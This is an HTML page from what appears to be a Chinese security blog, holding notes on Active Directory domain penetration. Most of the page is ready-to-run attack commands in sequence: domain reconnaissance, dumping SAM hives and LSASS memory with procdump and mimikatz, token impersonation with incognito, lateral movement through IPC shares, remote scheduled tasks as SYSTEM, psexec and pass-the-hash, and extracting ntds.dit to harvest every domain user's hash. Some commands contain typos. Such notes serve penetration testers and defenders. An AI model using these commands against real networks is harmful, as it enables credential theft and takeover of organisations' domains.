<!doctype html>
<html lang="en-US">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="generator" content="VuePress 2.0.0-rc.18" />
    <style>
      :root {
        --vp-c-bg: #fff;
      }

      [data-theme='dark'] {
        --vp-c-bg: #1b1b1f;
      }

      html,
      body {
        background-color: var(--vp-c-bg);
      }
    </style>
    <script>
      const userMode = localStorage.getItem('vuepress-color-scheme')
      const systemDarkMode =
        'matchMedia' in window
          ? window.matchMedia('(prefers-color-scheme: dark)').matches
          : false

      if (userMode === 'light') {
        document.documentElement.dataset.theme = 'light'
      } else if (userMode === 'dark' || systemDarkMode) {
        document.documentElement.dataset.theme = 'dark'
      }
    </script>
    <title>域渗透知识备忘 | T的网络日志</title><meta name="description" content="网络安全、渗透测试、编程语言、Writeup，随便写写，记录一些东西">
    <link rel="preload" href="/Blog-vuepress/assets/style-PoWje89h.css" as="style"><link rel="stylesheet" href="/Blog-vuepress/assets/style-PoWje89h.css">
    <link rel="modulepreload" href="/Blog-vuepress/assets/app-wq8tcF5a.js"><link rel="modulepreload" href="/Blog-vuepress/assets/域渗透知识备忘.html-DVx-0LlN.js">
    <link rel="prefetch" href="/Blog-vuepress/assets/index.html-B22YsjKi.js" as="script"><link rel="prefetch" href="/Blog-vuepress/assets/404.html-BDatcSwo.js" as="script"><link rel="prefetch" href="/Blog-vuepress/assets/setupDevtools-7MC2TMWH-Zzhu3GzH.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><div class="vp-theme-container external-link-icon" vp-container><!--[--><header class="vp-navbar" vp-navbar><div class="vp-toggle-sidebar-button" title="toggle sidebar" aria-expanded="false" role="button" tabindex="0"><div class="icon" aria-hidden="true"><span></span><span></span><span></span></div></div><span><a class="route-link" href="/Blog-vuepress/"><!----><span class="vp-site-name" aria-hidden="true">T的网络日志</span></a></span><div class="vp-navbar-items-wrapper" style=""><!--[--><!--]--><!----><!--[--><!--]--><button type="button" class="vp-toggle-color-mode-button" title="toggle color mode"><svg class="light-icon" viewbox="0 0 32 32" style="display:none;"><path d="M16 12.005a4 4 0 1 1-4 4a4.005 4.005 0 0 1 4-4m0-2a6 6 0 1 0 6 6a6 6 0 0 0-6-6z" fill="currentColor"></path><path d="M5.394 6.813l1.414-1.415l3.506 3.506L8.9 10.318z" fill="currentColor"></path><path d="M2 15.005h5v2H2z" fill="currentColor"></path><path d="M5.394 25.197L8.9 21.691l1.414 1.415l-3.506 3.505z" fill="currentColor"></path><path d="M15 25.005h2v5h-2z" fill="currentColor"></path><path d="M21.687 23.106l1.414-1.415l3.506 3.506l-1.414 1.414z" fill="currentColor"></path><path d="M25 15.005h5v2h-5z" fill="currentColor"></path><path d="M21.687 8.904l3.506-3.506l1.414 1.415l-3.506 3.505z" fill="currentColor"></path><path d="M15 2.005h2v5h-2z" fill="currentColor"></path></svg><svg class="dark-icon" viewbox="0 0 32 32" style=""><path d="M13.502 5.414a15.075 15.075 0 0 0 11.594 18.194a11.113 11.113 0 0 1-7.975 3.39c-.138 0-.278.005-.418 0a11.094 11.094 0 0 1-3.2-21.584M14.98 3a1.002 1.002 0 0 0-.175.016a13.096 13.096 0 0 0 1.825 25.981c.164.006.328 0 .49 0a13.072 13.072 0 0 0 10.703-5.555a1.01 1.01 0 0 0-.783-1.565A13.08 13.08 0 0 1 15.89 4.38A1.015 1.015 0 0 0 14.98 3z" fill="currentColor"></path></svg></button><!----></div></header><!--]--><div class="vp-sidebar-mask"></div><!--[--><aside class="vp-sidebar" vp-sidebar><!----><!--[--><!--]--><ul class="vp-sidebar-items"><!--[--><li><p tabindex="0" class="vp-sidebar-item vp-sidebar-heading">域渗透知识备忘 <!----></p><!----></li><!--]--></ul><!--[--><!--]--></aside><!--]--><!--[--><main class="vp-page"><!--[--><!--]--><div class="theme-default-content" vp-content><!--[--><!--]--><div><p>域渗透的一般流程：</p><p>入口主机--&gt;权限维持--&gt;横向渗透--&gt;取密码(域用户)--&gt;域信息收集--&gt;横向渗透--&gt;接管域控</p><h3 id="一、域信息收集" tabindex="-1"><a class="header-anchor" href="#一、域信息收集"><span>一、域信息收集</span></a></h3><p><strong>1、net</strong></p><p><code>net user /domain</code> 获取域用户列表 <code>net group. &quot;domain admins&quot; /doamin</code> 获取域管理员列表 <code>net group &quot;domain controllers&quot; /domain </code> 查看域控制器(如果有多台) <code>net group &quot;domail computers&quot; /domain</code> 查看域机器 <code>net group /domain</code> 查询域里面的组</p><p><code>net view</code> 查看同一域内机器列表 <code>net view \\ip</code> 查看某IP共享 <code>net view \\GHQ</code> 查看GHQ计算机的共享资源列表 <code>net view /domain</code> 查看内网存在多少个域 <code>net view /domain:XYZ</code> 查看XYZ域中的机器列表</p><p><strong>2、nltest信任域</strong></p><p>查询域间的信任关系 <code>nettles /domain_trusts /all_trusts /v /server:192.168.52.2</code> 返回所有信任192.168.52.2的域</p><p><code>nltest /dsgedc:XXXXX /serve:192.168.52.2</code> 返回域控和其相应的IP地址，XXXXX是上步骤结果中的一个域</p><p>nltest的命令： https://www.cnblogs.com/dreamer-fish/p/3473895.html</p><p><strong>3、nbtscan.exe</strong></p><p>扫描网段内是否存在域内机器</p><p><code>nbtscan.exe 192.168.52.0/24</code></p><p><strong>4、csvde</strong></p><p>csvde是windows server 2008的内置命令行工具，如果安装了AD DS或Active Directory轻型目录服务，则功能可用 <code>csvde -setspn hack -f c:\windows\temp\hack.csv</code> LDAP的存储规则： 区分名(DN)：一个条目的区分名叫做‘dn’，在一个目录中这个名称总是唯一的 CN=Common Name为用户名或服务器名，最长可以到80个字符，可以为中文 OU=Organization Unit为组织单元，最多可以有四级，每级最长32个字符，可以为中文 O=Organization 为组织名，可以3-64个字符长 C=Country为国家名，可选，为2个字符长</p><p><strong>5、setspn</strong></p><p><code>setspn -T 域名 -Q */*</code></p><ul><li>SPN官方名称即“服务主体名称”，本质上存的是域内各种服务资源的对应关系</li><li>如，对应的服务类型是什么，机器名是什么，服务端口是多少</li><li>借助SPN可以快速定位当前目标域中所有存活的各类服务器</li></ul><p>例如查找mssql服务器 <code>setspn -T 域名 -Q */* | findstr MSSQL</code></p><p><strong>6、dnsdump.exe</strong></p><p>获取域名其对应的IP地址 <code>dnsdump.exe -u 域名/域用户 -p 域密码 域控机器名 -r</code></p><h3 id="二、域渗透思路" tabindex="-1"><a class="header-anchor" href="#二、域渗透思路"><span>二、域渗透思路</span></a></h3><h4 id="_2-1、注册表读取密码-本地" tabindex="-1"><a class="header-anchor" href="#_2-1、注册表读取密码-本地"><span>2.1、注册表读取密码-本地</span></a></h4><p>​ <strong>1、获取注册表信息</strong>： <code>reg save HKLM\SYSTEM c:\windows\temp\Sys.hiv</code><code>reg save HKLM\SAM c:\windows\temp\Sam.hiv</code></p><p>​ <strong>2、mimikatz解密</strong><code>lsadump::sam /sam:Sam.hiv /system:Sys.hiv</code></p><h4 id="_2-2、lsass进程读取内存hash" tabindex="-1"><a class="header-anchor" href="#_2-2、lsass进程读取内存hash"><span>2.2、lsass进程读取内存hash</span></a></h4><p>windows 03和08中明文存储账号密码；12和16中加密为hash值</p><p>​ <strong>1、目标机执行procdump.exe</strong><code>procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp</code></p><p>​ <strong>2、mimikatz中运行,结果保存在日志里</strong><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code></p><h4 id="_2-3、lazagne取各种连接工具密码-浏览器保存密码等" tabindex="-1"><a class="header-anchor" href="#_2-3、lazagne取各种连接工具密码-浏览器保存密码等"><span>2.3、LaZagne取各种连接工具密码，浏览器保存密码等</span></a></h4><p>https://github.com/AlessandroZ/LaZagne</p><h4 id="_2-4、凭证窃取" tabindex="-1"><a class="header-anchor" href="#_2-4、凭证窃取"><span>2.4、凭证窃取</span></a></h4><p>通过tasklist /v查看进程用户，如果有域用户开启的进程，则窃取凭证</p><p><code>incognito.exe list_tokens -u</code> 查看目标机当前存储那些凭证 <code>incognito.exe execute -c &quot;HACK\Administrator&quot; cmd.exe</code> 使用域用户administrator凭证开启一个cmd</p><h4 id="_2-5、命令行渗透-ipc连接" tabindex="-1"><a class="header-anchor" href="#_2-5、命令行渗透-ipc连接"><span>2.5、命令行渗透-IPC连接</span></a></h4><p>为什么命令后渗透？？ 1、远程登录桌面增加暴漏风险 2、目标管理员可能对服务器禁用远程登录</p><ul><li>建立ipc连接 可以访问目标机器的文件(上传、下载)，也可以在目标机器上运行命令上传和下载文件直接通过copy命令就可以， 不过路径换成UNC路径。以\开头的路径就是UNC路径，比如\192.168.1.1\c$\users</li></ul><p><code>net use \\192.168.1.1 /u:域\域用户名 域用户密码</code><br> 例如：<code>net use \\192.168.1.1 /u:hack\administrator 1q2w3</code></p><ul><li>第二步：上传/下载文件 例如：从本地上传1.bat到192.168.1.1机器C盘根目录下 <code>copy 1.bat \\192.168.1.1\C$\</code></li></ul><p>dir、copy、xcopy、move、type的参数都可以使用UNC路径</p><h4 id="_2-6、命令行渗透-计划任务执行命令" tabindex="-1"><a class="header-anchor" href="#_2-6、命令行渗透-计划任务执行命令"><span>2.6、命令行渗透-计划任务执行命令</span></a></h4><ul><li><p>创建计划任务 <code>schtasks /create /tn 任务名 /U 域\域用户 /P 域用户密码 /tr 执行的命令或者bat路径 /sc ONSTART /s 域机器IP /RU system</code></p></li><li><p>执行计划任务</p><p><code>schtasks /run /tn 任务名 /s 域机器IP /U 域\域用户 -P 域用户密码</code></p></li><li><p>删除计划任务</p><p><code>schtasks /F /delete /tn 任务名 /s 域机器IP /U 域\域用户 /P 域用户密码</code></p></li></ul><p>例如：在192.168.1.1上建立task1任务（以system权限执行cmd程序） <code>schtasks /create /tn task1 /U hack\administrator /P 1q2w3e -tr &quot;c:\windows\system32\cms.exe /c whoami &gt; c:\\windows\\temp\\1.txt&quot; /sc ONSTART /s 192.168.1.1 /RU system</code></p><h4 id="_2-7、命令行渗透-psexec-exe" tabindex="-1"><a class="header-anchor" href="#_2-7、命令行渗透-psexec-exe"><span>2.7、命令行渗透-psexec.exe</span></a></h4><p><strong>知道域账号密码</strong></p><ul><li><p>建立IPC连接</p><p><code>net use \\192.168.1.1 /u:域\域用户名 域用户密码</code></p></li><li><p>执行命令</p><p><code>psexec.exe \\192.168.1.1 -s cmd.exe -accepteula</code> -accepteula第一次运行回弹框，输入这个参数便不会弹框；-s 以“nt authority\system”权限运行远程进程</p></li></ul><p><strong>不知明文域账号密码，hash传递</strong></p><p><code>psexec_hash.exe -hashes :用户hash 域名\用户名@目标IP</code></p><h4 id="_2-8、获取内网代理" tabindex="-1"><a class="header-anchor" href="#_2-8、获取内网代理"><span>2.8、获取内网代理</span></a></h4><p>内网中有些资源可能需要挂指定<code>代理</code>才能进行访问，一般是<code>IE</code>代理或<code>PAC</code>代理，这两个代理可以通过注册表来读取。</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">reg query <span class="token string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span> /v ProxyServer</span>
<span class="line">reg query <span class="token string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span> /v AutoConfigURL</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="三、windows-api-利用" tabindex="-1"><a class="header-anchor" href="#三、windows-api-利用"><span>三、Windows api 利用</span></a></h3><p>以下所有利用工具的前提都是已经<code>建立IPC连接</code></p><table><thead><tr><th style="text-align:left;">工具名称</th><th style="text-align:left;">功能</th></tr></thead><tbody><tr><td style="text-align:left;">NetGroupGetUsers.exe</td><td style="text-align:left;">查询域里的各个组里的成员，IP必须是域控IP，域用户随意</td></tr><tr><td style="text-align:left;">NetLocalGroupGetMembers.exe</td><td style="text-align:left;">查询目标服务器本地管理组的成员</td></tr><tr><td style="text-align:left;">NetUserEnum.exe</td><td style="text-align:left;">查询目标服务器所有用户，包括隐藏用户</td></tr></tbody></table><p>命令用法如下：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">NetGroupGetUsers.exe <span class="token string">&quot;domain users&quot;</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.52.2</span>
<span class="line">NetLocalGroupGetMembers.exe <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.52.2</span>
<span class="line">NetUserEnum.exe <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.52.2</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="四、导域hash" tabindex="-1"><a class="header-anchor" href="#四、导域hash"><span>四、导域HASH</span></a></h3><p>拿下域控之后，我们可以通过导出域hash将所有域用户的密码取出。</p><p><code>Windows</code>的密码是经过<code>hash</code>后存储的，本地存放在<code>hklm\sam</code>以及<code>hklm\system</code>注册表中，域里面是存放在域控制器的<code>c:\windows\ntds\ntds.dit</code>中。 <code>ntds.dit</code>其实就是个<code>esent</code>数据库，微软本身就有一系列文档化的<code>api</code>能够操作这个数据库：<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/gg294074.aspx" target="_blank" rel="noopener noreferrer">官方文档</a>，首先我们要创建一个快照：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">ntdsutil snapshot <span class="token string">&quot;activate instance ntds&quot;</span> creat quit quit</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>接下来我们挂载快照：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">ntdsutil snapshot <span class="token string">&quot;mount {快照id}&quot;</span> quit quit</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>接下来我们复制<code>ntds.dit</code>到本地：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">copy 装载位置<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>NTDS<span class="token punctuation">\</span>ntds.dit C:<span class="token punctuation">\</span>ntds.dit</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>接下来我们解除挂载：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">ntdsutil snapshot <span class="token string">&quot;unmount {快照id}&quot;</span> quit quit</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>最后删除快照：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">ntdsutil snapshot <span class="token string">&quot;delete {快照id}&quot;</span> quit quit</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>接下来我们就可以开始解密了，首先通过注册表的方式获取<code>KEY</code>，再用<code>NTDSDumpEx</code>获取所有域用户hash：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">reg save HKLM<span class="token punctuation">\</span>SYSTEM c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>temp<span class="token punctuation">\</span>sys.hiv</span>
<span class="line">NTDSDdumpEx.exe <span class="token parameter variable">-d</span> ntds.dit <span class="token parameter variable">-o</span> hash.txt <span class="token parameter variable">-s</span> sys.hiv <span class="token parameter variable">-h</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div></div><!--[--><!--]--></div><footer class="vp-page-meta"><!----><div class="vp-meta-item git-info"><div class="vp-meta-item last-updated"><span class="meta-item-label">Last Updated: </span><!----></div><div class="vp-meta-item contributors"><span class="meta-item-label">Contributors: </span><span class="meta-item-info"><!--[--><!--[--><span class="contributor" title="email: 24735925+TBOsec@users.noreply.github.com">TBOsec</span><!----><!--]--><!--]--></span></div></div></footer><!----><!--[--><!--]--></main><!--]--></div><!--[--><!----><!--]--><!--]--></div>
    <script type="module" src="/Blog-vuepress/assets/app-wq8tcF5a.js" defer></script>
  </body>
</html>
